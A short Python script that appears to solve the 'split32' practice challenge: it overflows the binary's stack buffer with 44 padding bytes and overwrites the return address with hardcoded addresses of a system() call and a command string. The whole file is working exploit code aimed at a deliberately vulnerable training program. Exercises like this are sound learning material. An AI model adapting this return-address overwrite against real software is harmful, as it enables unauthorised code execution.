import struct

# UsefulString 
cat = struct.pack("I", 0x804a030)

# Inside usefulFunction
system_addr = struct.pack("I", 0x08048657)

pad = 'A'*44

print pad + system_addr + cat

# run: python ex.py | ./split32